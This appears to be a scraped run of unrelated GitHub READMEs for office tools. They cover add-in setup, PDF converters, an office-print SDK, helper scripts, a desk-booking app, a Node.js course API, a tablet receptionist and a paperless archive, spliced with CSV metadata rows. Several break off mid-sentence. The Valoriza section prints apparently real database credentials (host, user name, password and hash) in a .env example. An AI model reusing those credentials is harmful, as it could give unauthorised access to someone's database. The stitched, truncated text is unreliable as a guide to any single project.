the professor or the department. Unexcused absences can result in a low
or failing participation grade. In the case of excessive absences, it is
up to the professor or the department to decide if the student will
receive an ""F"" for the course. An instructor may recommend that a
student withdraw, if absences have made it impossible to continue in the
course at a satisfactory level.
Students must be mindful of this policy when making their travel
arrangements, and especially during the Drop/Add and Exam Periods.

### Grading Policy
* 10% midterm
* 40% exercises
* 50% project

### Learning Outcome
Students are expected to learn how to develop software and content using a computer by using the HTML/CSS markup languages. In addition, they will learn the use of frameworks in order to improve the result. Some very basic programming in JavaScript will also be covered.

![Preview](doc/demo.gif)

## Setup
### Prerequisites
#### 1. Install Node.js
Download a suitable package from the [official page](https://nodejs.org/en/) and follow the instructions.

Please make sure that your [version supports ES6](https://nodejs.org/en/docs/es6/).
#### 2. Open a Node-enabled console
**Windows**: Node.js command prompt

**OSX/Linux**: Terminal
#### 3. Install Global Dependencies
In your console, enter the following command:
```
npm install -g bower gulp yo generator-office
```
This will install the global project dependencies [Bower](http://bower.io/), [Gulp](http://gulpjs.com/), [Yeoman](http://yeoman.io/), and [generator-office](https://github.com/officedev/generator-office).

### Install Project Dependencies
In your console, change the current working directory to the `office-addin-base` project folder, and enter the following commands in your console:
```
npm install
bower install
```
This will install all local project dependencies as configured in `package.json` (npm) and `bower.json` (bower).

## Create an Add-In Manifest
Enter the following command in your console:
```
yo office
```
Follow the instructions, and enter the following values when prompted:

_Technology to use_
```
Manifest.xml only (no application source files)
```

_Add-in start URL_
```
https://localhost:8443/
```
This will create a manifest that can be loaded in all supported Office products.

## Gulp Tasks
### `gulp build`
Creates a debug build in `/debug`.

### `gulp serve`
Runs the `build` task, and serves the debug build at `https://localhost:8443/`.

### `gulp ship-build`
Creates a production build in `/ship`.

### `gulp ship`
Runs the `ship-build` task, and uploads the contents of `/ship` to an FTP server (default directory: `/site/wwwroot`).

For this to work, you need to create a file called `ftp.json` in the root directory:
```javascript
{
  ""host"": ""..."",
  ""user"": ""..."",
  ""pass"": ""...""
}
```

## Run Your Add-In

United-Codes,cloudofficeprint-javascript,United-Codes,https://github.com/United-Codes/cloudofficeprint-javascript,https://api.github.com/repos/cloudofficeprint-javascript/United-Codes,JavaScript & TypeScript interface for Cloud Office Print,"# cloudofficeprint-javascript
This project provides a JavaScript/TypeScript interface for Cloud Office Print.

# Installation
After setting up an npm-project (`npm init` in your terminal), you can install the Cloud Office Print Java-/TypeScript package by typing in your terminal:  
`npm install cloudofficeprint`

The JavaScript/TypeScript SDK can also be used in a web browser by importing the file `bundle.js` from the browser-folder in your HTML file (see browser.html in the browser-folder for an example). The SDK is then available in the browser console as `cop`.

# Usage
1. Create a template (docx, xlsx, pptx, HTML, md, txt, csv), for the possible tags, click [here](http://www.cloudofficeprint.com/docs/#templates).
2. Create the input data with this Java-/TypeScript SDK
3. Send template and data to a Cloud Office Print server and save the response to a file with this Java-/TypeScript SDK

To see the JSON-data that is sent to the Cloud Office Print server, you can turn on verbose-mode by setting the argument `copVerbose` to `True` when creating a `PrintJob`.

# Quickstart: Hello World example
## Template (docx)
<img src=""https://raw.githubusercontent.com/United-Codes/cloudofficeprint-javascript/main/imgs/hello_world_template.png"" width=""600"" />

## Data
The data can be generated by the Java-/TypeScript SDK:
```javascript
import * as cop from 'cloudofficeprint';

// Main object that holds the data
const collection = new cop.elements.ElementCollection();

// Create the title element and add it to the element collection
const title = new cop.elements.Property(
    'title',
    'Hello World!',
);
collection.add(title);

// Create the text element and add it to the element collection
const text = new cop.elements.Property(
    'text',
    'This is an example created with the Cloud Office Print Java-/TypeScript SDK',
);
collection.add(text);
...
```

## Cloud Office Print server
The template and the data need to be sent to a Cloud Office Print server that merges both. This can be done by setting up the configuration for a Cloud Office Print server and passing it to the print job instance. You can get your API key by signing up at https://www.cloudofficeprint.com.
```javascript
...
const SERVER_URL = 'https://api.cloudofficeprint.com/';
const API_KEY = 'YOUR_API_KEY'; // Replace by your own API key

// Add server
const server = new cop.config.Server(
    SERVER_URL,
    new cop.config.ServerConfig(API_KEY),
);

// Create print job
const printjob = new cop.PrintJob(
    collection,
    server,
    cop.Resource.fromLocalFile('PATH_TO_TEMPLATE_FILE'),
);

// Asynchronously execute print job and save response to file
(async () => {
    const response = await printjob.execute();
    await response.toFile('PATH_OF_OUTPUT_FILE');
})();
```

## Result
<img src=""https://raw.githubusercontent.com/United-Codes/cloudofficeprint-javascript/main/imgs/hello_world_output.png"" width=""600"" />

# Other examples
Going through the other examples is also recommended as this gives you a good idea on how to use the SDK. The current examples are:
- order_confirmation_example.ts
- pdfsignature_example.ts
- solar_system_example.ts
- spacex_example.ts (the most extensive example)
- multiple_request_merge_example.ts

The examples can be found in the `examples`-directory of the project on [Github](https://github.com/United-Codes/cloudofficeprint-javascript). Each example has its own folder containing the used templates, the generated output files and a markdown file with explanation.

# Documentation
The documentation for this SDK can be found inside the `docs/` folder on [Github](https://github.com/United-Codes/cloudofficeprint-javascript). Open the index.html file in a browser.

The documentation for Cloud Office Print can be found at the [Cloud Office Print docs](https://www.cloudofficeprint.com/docs/).

# Development

## Documentation
To generate the documentation, you can run the following command in the project directory:
```bash
npx typedoc --out docs src/index.ts
```

## Tests 
There are tests for all classes and methods. The tests check if the JSON that needs to be sent to the server is as expected. To run the tests:
1. Open a terminal in the parent directory of this project, which can be found on [Github](https://github.com/United-Codes/cloudofficeprint-javascript).
2. Type in the terminal:
    ```bash
    npm run test
    ```
In the file `printjob.test.ts`, the tests for the `executeFullJson()`-function and for no input template are skipped because these tests need an API key to succeed. You can enable these tests by removing the `.skip` on the first line (as explained in the test file itself). The tests make use of the [jest](https://jestjs.io/)-package.

## Compiling
To compile the TypeScript code to JavaScript code, type in the terminal:
```bash
npm run build
```

To compile the TypeScript code with webpack, so that the package can be used in a browser, type in the terminal:
```bash
npm run bundle
```
This will create a file `bundle.js` that includes the full project, which can be imported in an HTML file (see `browser.html` in the browser-folder).

## ESLint
Airbnb style guide is used in this project with some modifications (see .eslintrc.json).  
To check the project for ESLint errors or warnings, you can type in your terminal:
```bash
eslint ""src/**""
```

Few command line script written to automate installation on Virtual machine which is using ubuntu & automate new installation of Raspberry PI.
Basically this script is written for internal use, but you are reading this & interested in same experiment, you can freely use this.

## Case
We are using ProxMox OS for virtualization platform on powerful server configuration & running Virtual Machines inside it for regular use. 
Raspberry PI is used as thin client for remote desktop. So basically idea is prepare desktop less office. Only Monitor, keyboard & mouse in front of you.

There are 2 parts for desktopless machines
* [Init-PI](init-pi)
* [Init-VM](init-vm)

## init-pi
Prepare Rspberry-Pi as RDP client.
This script install xfreerdp-x11. Purpose to use machine remotely. We choose xfreerdp among many other options & it works very well. 
Open [Init-PI](init-pi) for more references.

## init-vm
This is script is written for uses with ubuntu. You can try this with any other debian OS. It installs all necessory packages for regular use by developer, like IDE, FTP, SSH, communication & design tools etc.

## pfc
Its just for internal use. We have regular folder structure to maintain our project on each users machine. 
Project folder creator ([PFC](pfc)) command, just creates project folder & all necessory folders in user's home directory.

 Convenient automatic PDF conversion and organisation (●'◡'●)



With the power of [OfficeToPDF](https://github.com/cognidox/OfficeToPDF) AutoPDF will convert any office related document to `pdf`. ╰(\*°▽°\*)╯ For a complete list, take a look at [here](https://github.com/cognidox/OfficeToPDF#supported-file-types). Works only on **Windows** for now.



## Who needs it?

I myself wrote AutoPDF out of convenience for school. There are always teachers who upload their documents as `docx` and I am tired of opening Word, waiting till it's up and running and then export it to `pdf`, all while the lesson continues. (╯°□°）╯︵ ┻━┻

If you have similar experiences or are able to imagine another use case than for school, work etc, then it is the right tool for you ☜(ﾟヮﾟ☜).



## How it works

- Autonomous installation and updates of the`OfficeToPDf` binary (⌐■_■)
- Creates a replica of the folder structure from a specified root directory
- Opens automatically the `Explorer.exe` for you
- Listens to files being copied / moved into the replica and converts them to `pdf` into the original folder structure
- Windows notifications on important events



## How to get it running

Execute `main.py`:

​	`python main.py`

When prompted, specify the **root directory of your documents**. That's the top most folder, that you want AutoPDF to convert PDF-files to. **Do not** put something like `C:\` in that as all the subdirectories will be replicated and it might crash your computer. 

Next specify the root directory for the temporary replica of the previously specified directory. It really can be anywhere as long as it is empty. If the folder does not exist AutoPDF will create it for you.

AutoPDF will save the configuration so you won't have to configure it on subsequent uses again!

Or import `autopdf` into your Python-script and you'll now what to do :)



## Dependencies

Tested & developed on Python 3.9+.

`requirements.txt`:

```
watchdog
Send2Trash
requests
github3.py
packaging
win10toast_click
```



## Help

If any problems occur, please don't be afraid to create an issue or contact me directly. Any pull request is welcome :)



 ## Future

Much more sophisticated configuration paired with a simple graphical user interface would be amazing to have implemented. ╰(\*°▽°\*)╯

But packaging is more pressing as currently it is unlikely that someone without any Python knowledge is able to install and run AutoPDF ಠ_ಠ.



## Build

[Nuitka](https://github.com/Nuitka/Nuitka) is used for building `exe`-Files.

Following command is used to build releases (inside root directory of this repository):

`python -m nuitka --standalone --include-data-file=AutoPDF.ico=AutoPDF.ico --output-dir=build --prefer-source-code --windows-icon-from-ico=AutoPDF.ico --windows-product-name=AutoPDF --windows-file-version=0.0.1 --windows-company-name=TheSwampire --windows-file
-description=""Automatic PDF Conversion & Organization Tool"" --windows-product-name=AutoPDF main.py`

This will generate a folder containing `AutoPDF.exe`. 

If you prefer a single file add `--onefile`,  although in onefile-mode configuration won't be saved and OfficeToPDF.exe will be downloaded every time.

This font is edited from [SFWin](https://github.com/blaisck/sfwin) by [blaisck](https://github.com/blaisck).

The fonts are edited with `ttx` from [`afdko`](https://github.com/adobe-type-tools/afdko).
TTF files are generated from OTF files with `otf2ttf` from [`fonttools`](https://github.com/fonttools/fonttools).

Items changed in the OpenType font files includes:
* `name` table (Platform ID=3, Name ID = 1&2)
* `OS/2.fsSelection` field
* `macStyle` field

These are changed to fit the family and link the Regular, Italic, Bold and Bold Italic variant together in Microsoft Office, making the press of **`B`** and *`i`* buttons in Microsoft Office working correctly.

SF Mono Italic is a special case as the original font has Name ID 2 `Regular Italic`. The changes are reflected to other font name (`name` table - Name ID 1, 2, 3, 4, 6, 17 for both Platform ID 1 and 3).

Be aware that this font is only for **personal use only** for cross-platform compatibility. I do not provide any promises or guarantee for the font generated and any legal confirmation or endorsement for the use of font on platforms other than Mac OS.

Nelson-Gon,officetools,,https://github.com/Nelson-Gon/officetools,https://api.github.com/repos/officetools/Nelson-Gon,Handy bash scripts for use at the office.,"# officetools
Handy bash scripts for use at the office.

This repository holds a number of bash scripts that I have written to help reduce the amount of time that would be spent if I did what the scripts do manually.

**List of scripts**

1. **make_pdf.sh**

This provides an automated way to convert a variable number of powerpoint(pptx) slides to pdf. It is useful because you can simply provide a file name and have it converted to pdf. It is more opinionated because I personally prefer having files as pdf instead of pptx. 

To use the script, clone the repository as follows:
 
 * **Adding the script to your path(or not)**
 
```

#install git if not installed
git clone https://github.com/Nelson-Gon/officetools.git
# change directory to the directory where you cloned the repo
# We will assume it's in the home directory
# don't run this if otherwise
cd ~/officetools
# chmod of the script to make it executable, choose desired permissions
# make everything executable
sudo chmod +rwx *.sh
# copy contents to /bin
# copies all scripts to the binaries directory
sudo cp -rf *.sh  /bin

```

* **Example usage**

Say I have a file named test.pptx and need to convert it to pdf, then I will simply call:

```
# it is assumed that everything was copied to the binaries directory

make_pdf.sh test.pptx
# use a wildcard 

make_pdf.sh *.pptx
```

That's it. 

2. **make_slides.sh**


This provides a handy way to make [Beamer](https://github.com/josephwright/beamer) slides. 

**Usage**

Assuming you have up to this point followed the README as is, you can simply provide(in order) the beamer theme to use and the file(currently only markdown) that needs to be turned into a beamer slide. You can optionally supply a third argument for the desired filename. 

To show usage practically, try running:

```
# uses defaults
# uses test.md in officetools
# provide a theme ie Copenhagen and an input file name ie test.md
make_slides.sh Copenhagen test.md && evince test.pdf

```

That's it.

Office转PDF

 > 该库基于Office(或WPS) COM组件，因此只支持Windows系统，其他系统可以考虑使用其他库，例如Open Office、PHPOffice。

## 安装

 * Microsoft Office或WPS
 * PHP配置开启`com.allow_dcom = true`
 * PHP配置`extension=php_com_dotnet.dll`（PHP 5.4.5之前的版本自带，不需要开启）


## 使用

1. `composer require alanalbert/office2pdf`
2. 包含composer的自动加载文件`autoload.php`
3. 编写具体业务逻辑，如下（注意：Windows使用的中文编码为GBK，因此需要使用`iconv`函数进行编码转换）：


```php
require '../vendor/autoload.php';

$source_path_utf8 = ""E:/测试.doc"";                           // Word文件路径
$source_path = iconv('UTF-8', 'GBK', $source_path_utf8);	// 转为GBK，防止中文乱码而找不到文件
$output_path = $source_path . '.pdf';                       // PDF目标文件路径

$office = new Office\OfficeCOM();
$office->run('word');
var_dump($office->word2Pdf($source_path, $output_path));
$office->close('word');
```

## 方法

```php
/*
 * @method boolean      run($type = 'all')                      运行应用, 参数: all|word|excel|ppt
 * @method boolean      close($type = 'all')                    关闭应用, 参数: all|word|excel|ppt
 * @method int|false    getPageNumFromDoc($file)                获取Word文档页数
 * @method int|false    getPageNumFromPpt($file)                获取PPT文档页数
 * @method int|false    getPageNumFromExcel($file)              获取Excel文档页数
 * @method int|false    getPageNumFromPdf($file)                获取PDF文件页数
 * @method boolean      word2Pdf($source_file, $output_file)    Word转PDF
 * @method boolean      excel2Pdf($source_file, $output_file)   Excel转PDF
 * @method boolean      ppt2Pdf($source_file, $output_file)     PPT转PDF

DArchivist is meant to be your personal digital archivist, helping you archive and find your documents in your paperless (home) office. Its goal is to keep everything as simple and straightforward as possible. No databases, no dependencies on tools, as few frameworks as possible.

TODO: Describe Software, idea and principle behind DArchivist while going paperless.

## Build & Install

After cloning the project, it can be just compiled by:

```shell
$ go generate
go: downloading github.com/go-chi/chi v1.5.1
go: downloading github.com/go-chi/cors v1.1.1
go: downloading github.com/shurcooL/vfsgen v0.0.0-20200824052919-0d455de96546
go: downloading github.com/shurcooL/httpfs v0.0.0-20190707220628-8d4bc4ba7749
$ go build
```

As you can see the `go generate` step creates a virtual filesystem that contains all the UI sources that will be served by the application's webserver. After valling `go build` the binary (`go-vue`) should be created.

After starting the application, it will listen on port 9055:

```shell
$ ./darchivist
INFO:  2021/01/10 14:04:04 Web UI listening on: :9055
```

## Start

At startup you must tell DArchivist the path where it can find the archive's documents. This can be either done by command line flag or environment variable:

```shell
& darchivist --

Eine [AutoIt](https://www.autoitscript.com/site/autoit/)-Funktion für die Tabellenkalkulation [PlanMaker](https://www.softmaker.de/softmaker-office-planmaker) der Firma [SoftMaker](https://www.softmaker.de/softmaker-office), zum Speichern des aktuellen Dokuments als PDF.

Die API von PlanMaker beinhaltet diese Funktion leider nicht, deshalb arbeitet diese Funktion mit Erkennung von Dialogen und einer Tastatur-Simulation.

:warning: Alle Parameter für den PDF-Export müssen vor dem Export per Hand eigestellt werden.

## Übersicht

Parameter:
```autoit
__PlanMaker_SafePDF($sTitle, $sFile, $sPDFExportTitle = ""PDF-Export"", $sSaveTitle = ""Speichern unter bestätigen"")
```

Beispiel:
```autoit
__PlanMaker_SafePDF(""test.pmdx"", ""Test.pdf"")
```
Speichert die Datei` text.pmdx` im gleichen Verzeichnis als PDF `Test.pdf`.


Die letzten beiden Parameter sind für die Dialogerkennung in anderen Sprachen als Deutsch.


## Voraussetzungen

Kompatibel mit SoftMaker Office 2018 und FreeOffice 2018.


## Installation

In das Include Verzeichnis von AutoIt kopieren und als UDF einbinden, oder die Funktion in das eigene Programm kopieren.

# AirFreight
A tool to check Serial Numbers in Packages (e.g. air freight)

###### Developed for a company to check their icoming freight.

## Usage
You need a csv Table with Serial Numbers or any other strings you want to check (the program doesn't care). When you open it it will ask you to insert the name of the file and will load the numbers in it.

After that you can check if every number from your table is present, like in a package for example. If you want to seperate the numbers, you can press p and Enter to create a new package.

At the end AirFreight is going to write text files with the numbers in the right package (Also PDF147 Codes from v3).

## Installation
If you just want to check some numbers, download the executable in the folder of each version. If you want to compile it on your own, download the cpp file and compile it, with gcc for example.

If you need AirFreight a bit longer you may want to download the installer and have it in your app directory (from v3_GUI on)

The program is written for windows, if someone wants to port it to linux, feel free to do so.

## Thanks
Thanks to the programmers of [zint](https://github.com/zint/zint) (Barcode Generator) and Bill Stewart for [PathMgr](https://github.com/Bill-Stewart/PathMgr/) (dll to add AirFreight to PATH variable).

An open source hybrid work solution :office:

## :star: Features :star:
- Set a limit on the total number of people in the office per day
- Employees can reserve time in the office
- Employees can book desks and meeting rooms
- View when others are in the office and where they are working
- View charts and metrics to see how employees are using the office
- Single-sign on (via [Auth0](https://auth0.com/))

See the [backlog](https://github.com/adamkasztenny/hybridly/projects/1) for planned features.

## Quick Start
You will need an Auth0 account, as well as Docker, make and Ruby 3.0.0 installed for these steps.

1. In Auth0, create a [regular web application](https://auth0.com/docs/applications/set-up-an-application/register-regular-web-applications).
  1. `Allowed Callback URLs` should be `http://localhost:3000/authentication/callback`
  1. `Allowed Web Origins` and `Allowed Origins (CORS)` should be `http://localhost:3000`

1. Run these steps to start the server:
```bash
	export DEFAULT_USER_EMAIL=<the email you plan to log in with>

	# these values will be in the Auth0 application
	export AUTH0_DOMAIN=...
	export AUTH0_CLIENT_ID=...
	export AUTH0_CLIENT_SECRET=...

	make create_secret
	make start
	make seed_container
```
Open [localhost:3000](http://localhost:3000) in your browser to use Hybridly!

## Local Development
In addition to the tools above, you will also need Node and Yarn installed for local development.
[asdf](https://asdf-vm.com/) can be used to manage tool versions.

To start the development server, the steps are the same as above, except run
`make start_development` instead of `make start`, and run `make seed` instead
of `make seed_container`.

To run tests, run `make test`. To run the linter, run `make lint`.

## Getting Started
---

### Install
Install the project dependencies by going to the project folder and running 

`npm install`

Once that's done, make sure to install MongoDB to your machine. Once that's done, you can run your mongo instance by running the `mongod` command


### Running it

In order to run the project, run the following commands in order, in separate terminal windows. (I know, I know. It sucks but haven't figured out a better way :(

If you're Mongo instance isn't running yet, run

`mongod`

then run the backend server application with

`npm start`

then run the front end with

`ng server`

*Make sure all are running in separate terminal/command prompt windows concurrently*

And you have a running app! You can visit the site with the default port at localhost:4200 in most browsers.

将xlsx表格中的每一条数据按照模版转换成doc文件的批处理程序，支持图片链接下载。

## 使用
1. 打包程序为可执行文件
2. 将需要处理的xlsx文件命名为target.xlsx并放置于可执行文件同级目录
3. 编写config.json并放置于可执行文件同级目录
4. 编写template.docx并放置于可执行文件同级目录
5. 执行可执行文件，并得到输出文件夹output

> `target.xlsx`、`config.json`、`template.docx` 必须要有，格式和作用直接看example就懂了。

## 其他
docx-rs这个库有点问题，以本地引入的方式引入

``` toml
docx-rs = { path = ""./docx-rs-0.3.4"" }
```

resolve-xlsx-link是一个单独的包，用来处理xlsx文件中HYPERLINK的问题（将点击跳转的目标地址转换为显示的文本）

这个项目是很久之前的了，只是最近才放到github上，所以代码中有一些问题没有处理的很好，但正常使用是没问题的，如果遇到问题可以提issue或者邮箱联系我

编译release的时候会卡在一个库上，一直没找到原因，记录一下

teilorbarcelos,valoriza,,https://github.com/teilorbarcelos/valoriza,https://api.github.com/repos/valoriza/teilorbarcelos,API Node.js course by Rocketseat.,"## Valoriza
 
<p>This API was developed in a programming course of NodeJs of the <a target=""_blank"" href=""https://app.rocketseat.com.br/"">Rocketseat</a> online school, in the Next Level Week event for programmers of all levels.</p>

<p>This API was created with <a target=""_blank"" href=""https://nodejs.org/en/"">[NodeJs]</a> and, basically, creates a back-end system to answer to a front-end app in other or same server.</p>

<p>The data is all stored in a mySQL database, you can use other server, originally, in the course, was used the little sqlite, but, for learning more, I decided to use a free online server with mysql, I choose the <a target=""_blank"" href=""http://remotemysql.com"">Remote MySQL</a>, fill free to use what you want.</p>
 
## Technology 
 
Here are the technologies used in this project.
 
* typeorm version ^0.2.36
* reflect-metadata version ^0.1.13
* mysql version ^2.18.1
* jsonwebtoken version ^8.5.1
* express-async-errors version ^3.1.1
* express version ^4.17.1

* <a target=""_blank"" href=""http://remotemysql.com"">Remote MySQL</a>
 
## Getting started
 
<p>You can see this API runing <a target=""_blank"" href=""https://valorize.herokuapp.com/"">here</a></p>
<p>But, if you want to run this API by yourself, simply create a mySQL database in any online server like <a target=""_blank"" href=""http://remotemysql.com"">Remote MySQL</a>.</p>

<p>In next, you need to write the app credentials in a file "".env"" in the root directory like it:</p>

<pre><code>
# .env

TYPE=mysql
HOST=remotemysql.com
DB_PORT=3306
USER_NAME=eKJ242AF5H
DATABASE=eKJ242AF5H
PASSWORD=iVsoDUtm8b
ENVIRONMENT=development

HASH_MD5=d48946382f0b249f659bbf519747fb65
</code></pre>

<p>In next, you need to run the migrations with the command ""yarn typeorm migration:run"" to create the tables in your MySQL, and for last, run ""yarn dev"" to run the local test server and to test the app locally in ""http:localhost:3000"".</p>

 
## How to use
 
- To use this API you will need of a front-end app that was coded to comunnicate with it, you can see one of it <a target=""_blank"" href=""https://github.com/teilorbarcelos/icompliment"">here</a> and runing and ready to use <a target=""_blank"" href=""http://icompliment.vercel.app/"">here</a>.

It is typically used to display a list of employee names on a tablet, which should be placed in the reception of your office.  It will then ping everyone (or individuals) a notification when someone taps their name.  Sky is a dirt cheap, virtual receptionist!","# Sky--Virtual-Receptionist
Sky is a simple app that uses zapier hooks and a messaging program of your choice (e.g. pushbullet, slack) to greet guests at the door and notify whoever you choose.  Add her to an Android tablet or an old iPad.  Sky will notify you when someone visits your office.

Created by: Steve Johnson @aBiG_Tree
Version: 1.0
Date: 26 June 2018
Summary: Quick and dirty way of having a professional looking virtual receptionist.  Intended for small companies, otherwise the notifications would be just stupid.

Requirements:
- Tablet (anything will work, but an older high-end is waaayyy better than a new cheap tablet)
- Tablet Stand (e.g. https://www.amazon.co.uk/s/field-keywords=secure+tablet+floor+stand)
- Zapier account
- Charging cable/plug (remember it needs to go down the back of the stand and up the wall.  I went for a 4m cable.)
- Full screen browser app (there's quite a few)
- Somewhere private to locate your file (e.g. FTP access)

Instructions
1. Go to Zapier and create a new zapp.  For the Trigger, select 'Webhooks' and select 'Catch Hook'
3. Enter the URL it gives you into each button below and append a persons name (or whatever) onto the URL.  See examples below.
4. Back in Zapier, select Pushbullet as the Action and select 'Send a Note'
5. For the template, use something decent for the title (I went with 'There's somebody at the door ha ha') and in the body add your catch hook.  
6. Install the desktop or chrome extension of Pushbullet, or whatever it is you're using and submit a test.
7. Once the below is done, upload your file somewhere accessible on the web.  I uploaded it to one of my sites via FTP and blocked it from the outside world using htaccess, so it can only be accessed via our IP address.
8. On your tablet, download a fullscreen browser and browse to your file (do a test on something off the network to check the block worked).
9. If your're on iOS, go into the accessibility settings and turn on 'Guided Access' to prevent people leaving the browser.  It'll walk you through it.
10. That's it!  You can now push out updates by updating the file via FTP and the tablet will pull them through overnight.

Optional: For The In Out System
11. Add your users names into the top next to $user1 etc.
12. In Zapier, create a webhook and place it next to $ZapierURL.  Leave the ?employee= part in.
13. Copy and paste everything between <div class=""features-block-box in-out""> and the closing div as many times as you need.  Make sure you update the $user number for each one as you go sequentially.  
14. Also update the $user numbers and add in the new names towards the top of page 
15. Update the URL in the javascript at the bottom of the page - next to window.location

Notes
This probably isn't that tidy and I expect others could improve it - go for it!  I initially started it because as a small business, we don't have a receptionist.  So visitors and people delivering parcels would just wander in and as i was nearest the door, they'd come to me (I don't people all that well!!).  I then started to look into various solutions, but I was amazed at the amount of crap out there.  We already had an old tablet knocking around, so this only cost us about £60 all in.  Anyway, I started tinkering and ended up with this after a few iterations.  Hopefully it'll help a few people out.

I installed Pushbullet initially and later Slack on peoples machines to receive messages, but I expect you could probably hook it up to pretty much any messaging service. 

If you paid for the premium version of Zapier, you could set it up to notify a group of people or specific departments.  Otherwise i can see this getting a bit out of hand for larger companies (there's about 15 of us).

Feel free to use this, but it would be nice if you credited me.  Cheers!

# tidystats Word add-in

The tidystats Word add-in is an add-in for Microsoft Word to insert statistics from a file created with the [tidystats](https://github.com/WillemSleegers/tidystats) R package.

## Requirements

You need the following to use add-in:

- An internet connection (the add-in is a web app that runs inside of Word)
- A compatible version of Microsoft Word:
  - Word 2016 or later on Windows
  - Word 2016 or later on Mac
  - Word on the web

For more information on the requirements, see [here](https://docs.microsoft.com/en-us/office/dev/add-ins/concepts/requirements-for-running-office-add-ins).

## Installation

The add-in will become available in the Office add-in store. Once available, the add-in can be installed via the add-in store, which can be found in the Insert tab of your Word document. If you already want access to the add-in, see the Testing section below.

## Usage

Before you can use the tidystats Word add-in, you must create a file containing your statistics using the `tidystats` R package. For details on how to do this, please see the <a href=""https://willemsleegers.github.io/tidystats/articles/introduction-to-tidystats.html"">introduction to tidystats</a> vignette on the R package [website](https://willemsleegers.github.io/tidystats/) of `tidystats`.

If you simply want to try out the add-in, you can also use [this](data/example.json) example file.

Once you have a file created with `tidystats` and you want to insert the statistics into your document, go to the Insert pane of your Word document and click on 'Insert Statistics'.

![](images/screen0.png)

Next, click on 'Upload statistics' and select the file you created with `tidystats`.

![](images/screen1.png)

This should reveal a list of your analyses, each with a name that identifies your analysis. You can use the Search text box to search for your analyses.

![](images/screen2.png)

Click on one of the analyses to reveal its statistics. You can then click on the name of a statistic or set of statistics to insert them into your document.

![](images/screen3.png)

For more information on tidystats, see its website at <a href=""https://tidystats.io"">https://tidystats.io</a>.

If you have any questions about how to use `tidystats`, or suggestions for improvements, you can contact me on [Twitter](https://twitter.com/willemsleegers) or via [e-mail](mailto:tidystats@gmail.com).

## Testing

The current release version of the add-in is 1.0. This means that the add-in is sort of feature complete, but there is still a lot of room for improvements and new features. If you want to help test newer versions, you can install the development version of the add-in. For instructions on how to do this, see below.

### Installing the development version of tidystats for Word

Download one of the manifest files. This is the file that needs to be installed on your computer somewhere in order to run the add-in. Download the local manifest file if you can host the web-app yourself; download the netlify manifest file for the most recent version of tidystats; and download the web manifest file for the latest official release version of tidystats.

#### Mac

To install the add-in in Mac, see the 'Sideload an add-in in Office on Mac' section [here](https://docs.microsoft.com/en-us/office/dev/add-ins/testing/sideload-an-office-add-in-on-ipad-and-mac#sideload-an-add-in-in-office-on-mac). Briefly put, you need to put the manifest file in the following folder:

> /Users/\<username\>/Library/Containers/com.microsoft.Word/Data/Documents/wef

If the 'wef' folder does not exist yet, simply create it and put the manifest file inside. After doing that, you can access the add-in via Insert ribbon > Add-ins > My Add-ins (click on the dropdown arrow; only then will you see the Developer add-ins). You should see the tidystats add-in in the list. Simply click on it and the add-in will open.

That's it for Mac <3.

#### Windows

Start by creating a new folder somewhere on your computer. Share this folder by right-clicking on the folder and select Properties. Go to the Sharing tab and click on the Share button to start sharing the folder. This step should create a network path. Copy this path.

Open a Word document and go to File -> Options -> Trust Center. Here, click on Trust Center Settings and then Trusted Add-in Catalogs. In the Catalog Url box, enter the full network path to the folder that you shared previously. Click on Add catalog and make sure the Show in Menu checkbox is checked. Click on OK and restart Word.

Next, put the manifest file you downloaded from here in the shared folder.

In Word, go to the Insert tab and click on My Add-ins. Choose Shared Folder at the top of the Office Add-ins dialog box. Select the name of the add-in and choose Add to insert the add-in. The add-in should now be installed.

For more information, see [this](https://docs.microsoft.com/en-us/office/dev/add-ins/testing/create-a-network-shared-folder-catalog-for-task-pane-and-content-add-ins) webpage, which also includes a link to a Youtube video explaining how to install the add-in.

### Bugs and feature requests

Found a bug or got an idea about how to improve the add-in? Please create a [Github issue](https://github.com/WillemSleegers/tidystats-Word-add-in/issues). If you need some help figuring out how this works, see this support [page](https://help.github.com/en/articles/creating-an-issue) by Github or simply contact me on [Twitter](https://twitter.com/willemsleegers) or send me an [e-mail](mailto:tidystats@gmail.com).

swinkelhofer,paperless-office,,https://github.com/swinkelhofer/paperless-office,https://api.github.com/repos/paperless-office/swinkelhofer,"No more paper. Archive all paper documents to allow full-text searching, tagging and Git based backup","# Paperless Office

<img src=""assets/leaf.svg"" height=""100px"">

The future is paperless. Unfortunately, most authorities (at least in Germany) still love paper, rendering 'digitalization' a foreign word.

To bypass this stale state, I started this project which allows scanned (and therefore digitized) documents to be...
* ... archived and stored savely
* ... (full-text) searched
* ... tagged

The goal for this project was not only environmental happiness, but also customer happiness.

Some of the key-features are:

* Automatic OCR of scanned documents enables full-text search on any document.
* Manual tagging improves searching the right document at the right time.
* Automatic Git backups reduce waste of physical space when compared to paper backups.
* An optional web viewer allows access to your documents. Anywhere, anytime.

## Prerequisites

* A (document) scanner (necessary)
* A container engine like Docker (recommended)
* docker-compose (recommended)
* Access to any Git provider (e.g. [GitLab](https://gitlab.com) or [GitHub](https://github.com), recommeded)

## Screenshots

![](assets/screenshots.png)

## How it works

1. Scan a document to a PDF file
2. Either upload the scanned PDF via the paperless-office Web UI or just dump it into the raw documents folder (see TODO: Configuration)
3. Let the server side do the text recognition magic. Once finished, the new document is accessible via the `Unconfirmed` section via the Web UI
4. Add some tags, double-check dates and recognized meta data (like URLs, e-mail addressess...)
5. Save and confirm the document. Saving triggers pushing the file to the Git repository (if configured). From now on, the document is prepared to be found in your paperless office.

## Setup

Using docker-compose is the most simple way to set up paperless-office.

* Prepare your environment:
  ```bash
  cd /path/paperless-office-documents
  mkdir -p data/raw data/processed

  # BEGIN Optionally init git repository
  cd data/processed
  git init

  # At the moment only https basic auth for Git is supported
  git remote add origin https://username:password@your.git/username/paperless-office-documents.git

  # Create .gitlab-ci.yaml or GitHub actions workflow, depending on your Git provider. For a GitLab snippet see further below.
  touch .gitlab-ci.yaml

  # Get the webviewer.json and index.html
  wget https://github.com/swinkelhofer/paperless-office/releases/latest/download/webviewer.js
  wget https://github.com/swinkelhofer/paperless-office/releases/latest/download/index.html

  # Stage and push your initial changes
  git add -A
  git commit -am ""Init""
  git push

  cd ../..
  # END Optionally init git repository

  # Display your user ID for configuration in the next step
  id -u
  ```
* Save and adjust the following snippet to a file named `docker-compose.yaml`:
  ```yaml
  version: ""3.6""
  services:
    paperless-office:
      image: ghcr.io/swinkelhofer/paperless-office:latest
      # user must match the UID of the volumes' owner
      user: ""1000:1000""
      ports:
        - ""8000:8000""
      volumes:
